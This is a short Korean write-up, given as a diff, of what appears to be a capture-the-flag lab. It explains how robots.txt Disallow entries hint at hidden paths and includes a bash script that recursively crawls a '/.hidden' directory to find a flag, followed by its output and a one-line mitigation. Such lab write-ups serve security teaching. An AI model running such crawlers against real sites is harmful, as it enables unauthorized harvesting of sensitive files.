@@ -1,0 +1,50 @@
+robots.txt란?
+
+- robots.txt는 로봇 배제 표준으로 알려진 규약으로서 해당 웹사이트에 대한 크롤링 지침을 전달하기 위한 용도로 사용된다. 
+쉽게 말해 접근 가능/불가능한 페이지, 디렉터리, 크롤러를 명시함으로써 크롤러를 제어할 수 있는 파일이다.
+
+- 악의적 목적을 가진 해커가 robots.txt 파일에 접근하여 특정 페이지가 Disallow로 설정 된 것을 확인한다면,
+페이지에 흥미로운 정보가 있다고 추측하여 해당 페이지에 접근하여 민감한 정보를 획득하려고 할 것이다.
+
+/.hidden에 있는 디렉터리를 다 들어가봐서 README를 읽어 그 안에 중요 정보가 있는지 캐낸다.
+웹 스크래핑 자동화 셸 스크립트를 실행하면 중요 정보를 얻을 수 있다.
+
+#!/bin/bash
+
+URL="<your_ip_address>.hidden/"
+TOTAL=0
+START="$(date +%s)"
+
+function search {
+	LINKS=$(curl -s $1 | grep "<a href=" | cut -d'"' -f2 | sort -r)
+	for link in $LINKS; do
+		if [ $link == "../" ]; then
+			continue
+		elif [ $link == "README" ]; then
+			let TOTAL=TOTAL+1
+			README=$(curl -s "${1}${link}")
+			if [[ $README =~ ^[0-9a-f]+$ ]]; then
+				echo "THE FLAG IS ${README}"
+				echo "FOUND IN ${1}"
+				echo "README SEARCHED ${TOTAL}"
+				END=$(date +%s)
+				ELAPSED=$(($END - $START))
+				echo "TIME ELAPSED $(($ELAPSED / 60)) MIN $(($ELAPSED % 60)) SEC"
+				exit 0
+			fi
+		else
+			search "${1}${link}"
+		fi
+	done
+}
+
+search $URL
+echo "NOT FOUND"
+
+THE FLAG IS 99dde1d35d1fdd283924d84e6d9f1d820
+FOUND IN http://192.168.123.169/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/
+README SEARCHED 2583
+TIME ELAPSED 0 MIN 47 SEC
+
+대응방법
+1. 웹 사이트 디렉터리에 절대로 중요 정보를 저장하지 않는다!
